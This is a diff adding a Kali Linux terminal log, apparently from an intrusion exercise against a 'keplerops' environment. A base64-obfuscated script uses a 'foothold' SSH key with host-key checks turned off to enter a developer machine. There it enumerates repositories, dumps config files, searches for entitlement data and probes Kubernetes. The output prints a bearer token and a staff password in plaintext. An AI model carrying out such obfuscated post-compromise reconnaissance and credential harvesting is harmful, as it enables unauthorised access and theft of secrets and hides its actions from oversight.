@@ -1,0 +1,39 @@
+└─$ └─$ 
+
+┌──(cinder@kali)-[~]
+└─$ └─$ base64 -d > /tmp/k08ws2.sh <<'B64EOF'
+> dGltZW91dCA2MCBzc2ggLW8gU3RyaWN0SG9zdEtleUNoZWNraW5nPW5vIC1vIENvbm5lY3RUaW1lb3V0PTEwIC1pIH4vLnNzaC9rZXBsZXJvcHMtZm9vdGhvbGQgLXAgMjIyMiByb3dhbkByb3dhbi1kZXYgJwplY2hvICI9PT0gcmVwb3MgPT09IjsgbHMgLWxhIH4vcmVwb3M7IGVjaG8KZWNobyAiPT09IGNvbmZpZyBmaWVsZGxpbmsgPT09IjsgZmluZCB+Ly5jb25maWcvZmllbGRsaW5rIC10eXBlIGYgLW1heGRlcHRoIDIgLXByaW50IC1leGVjIGhlYWQgLWMgNDAwIHt9IFw7IDI+L2Rldi9udWxsOyBlY2hvCmVjaG8gIj09PSBncmVwIGVudGl0bGVtZW50IGhvbWUgPT09IjsgZ3JlcCAtcmlsIGVudGl0bGVtZW50IH4gLS1leGNsdWRlPWNvcmUgMj4vZGV2L251bGwgfCBoZWFkIC00MDsgZWNobwplY2hvICI9PT0gZmluZCBlbnRpdGxlbWVudCBmcyA9PT0iOyBzdWRvIC1uIGZpbmQgLyAtaW5hbWUgIiplbnRpdGxlKiIgLW5vdCAtcGF0aCAiL3Byb2MvKiIgMj4vZGV2L251bGwgfCBoZWFkIC00MDsgZWNobwplY2hvICI9PT0ga3ViZSBucy9zdmMgPT09Ijsga3ViZWN0bCBnZXQgbnMgMj4mMSB8IGhlYWQ7IGVjaG87IGt1YmVjdGwgZ2V0IHN2YyAtQSAyPiYxIHwgaGVhZCAtNDA7IGVjaG8KZWNobyAiPT09IGt1YmUgcG9kcyA9PT0iOyBrdWJlY3RsIGdldCBwb2RzIC1BIDI+JjEgfCBoZWFkIC00MAonIDI+JjEgfCBoZWFkIC0yMDAK
+> B64EOF
+
+┌──(cinder@kali)-[~]
+└─$ └─$ chmod +x /tmp/k08ws2.sh; bash /tmp/k08ws2.sh; echo DONEMARK_1795207475473$((6*7))
+=== repos ===
+total 1728
+drwxr-xr-x  6 rowan rowan    4096 Nov 20 17:31 .
+drwx------ 14 rowan rowan    4096 Nov 20 20:07 ..
+drwxr-xr-x  3 rowan rowan    4096 Nov 20 17:31 connector-archive
+-rw-r--r--  1 rowan rowan  631366 Nov 20 17:31 connector-archive.zip
+drwxr-xr-x  3 rowan rowan    4096 Nov 20 17:31 fieldlink-connector
+-rw-r--r--  1 rowan rowan    2099 Nov 20 17:31 fieldlink-connector.zip
+drwxr-xr-x  3 rowan rowan    4096 Nov 20 17:31 policy-compiler
+-rw-r--r--  1 rowan rowan 1100181 Nov 20 17:31 policy-compiler.zip
+drwxr-xr-x  3 rowan rowan    4096 Nov 20 17:31 release-signer-history
+-rw-r--r--  1 rowan rowan     841 Nov 20 17:31 release-signer-history.zip
+
+=== config fieldlink ===
+/home/rowan/.config/fieldlink/support-client.json
+{"service_url": "https://support.keplerops.test:8443", "principal": "rowan.ito", "authorization": "Bearer fk_support_rowan_2fxtXNkUjKMbcvPBlAot0Jp0vVNppL9b", "ca_file": "/home/rowan/.local/share/keplerops/ca.crt", "retained_staff_login": {"url": "https://support.keplerops.test/scp/", "username": "maya.ranscombe", "password": "sWQa31085FTQekZhHTxUyf_9E1marq0ur8WNCKmTtnk", "note": "Retained support-
+=== grep entitlement home ===
+/home/rowan/repos_k05/connector-archive/connector-archive/internal/fieldlink/legacy-diagnostics/CRR-OG2/ENT-ARWC-DIAG-0698.json
+/home/rowan/repos/connector-archive/connector-archive/internal/fieldlink/legacy-diagnostics/CRR-OG2/ENT-ARWC-DIAG-0698.json
+/home/rowan/work/registry/README.md
+
+=== find entitlement fs ===
+
+=== kube ns/svc ===
+Error from server (Forbidden): namespaces is forbidden: User "system:serviceaccount:fieldlink:rowan-workspace" cannot list resource "namespaces" in API group "" at the cluster scope
+
+Error from server (Forbidden): services is forbidden: User "system:serviceaccount:fieldlink:rowan-workspace" cannot list resource "services" in API group "" at the cluster scope
+
+=== kube pods ===
+Error from server (Forbidden): pods is forbidden: User "system:serviceaccount:fieldlink:rowan-workspace" cannot list resource "pods" in API group "" at the cluster scope
